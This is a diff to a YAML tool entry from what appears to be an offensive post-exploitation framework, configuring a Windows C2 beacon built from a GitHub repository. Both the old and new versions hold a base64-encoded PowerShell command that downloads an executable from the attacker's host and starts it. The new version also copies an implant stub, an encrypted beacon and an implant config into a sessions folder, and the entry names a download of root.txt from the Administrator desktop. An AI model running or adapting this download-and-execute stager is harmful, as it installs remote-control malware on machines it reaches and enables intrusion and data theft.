@@ -14,8 +14,7 @@ tool:
   repo_url: https://github.com/grisuno/beacon.git
   install_path: external/.exploit/beacon
   install_command: make windows
-  execute_command: chmod +x *.sh && ./gen_beacon.sh && upx beacon.exe
-  upload_file: no_priv ./external/.exploit/beacon/beacon.exe
-  remote_command: no_priv .\beacon.exe
+  execute_command: git restore . ; git pull ; chmod +x *.sh && ./gen_beacon.sh && cp stub.exe ../../../sessions/stub.exe && cp beacon.enc ../../../sessions/beacon.enc && cp implant_config_windows.json ../../../sessions/implant_config_windows.json
   download_file: C:\Users\Administrator\Desktop\root.txt
-  lazycommand: encodewinbase64 powershell -c \"Invoke-WebRequest 'http://{lhost}/beacon.exe' -OutFile 'beacon.exe'; Start-Process 'beacon.exe'\"
+  lazycommand: >-
+    encodewinbase64 powershell -c 'Invoke-WebRequest "http://{lhost}/stub.exe" -OutFile "stub.exe"; Start-Process "stub.exe"'
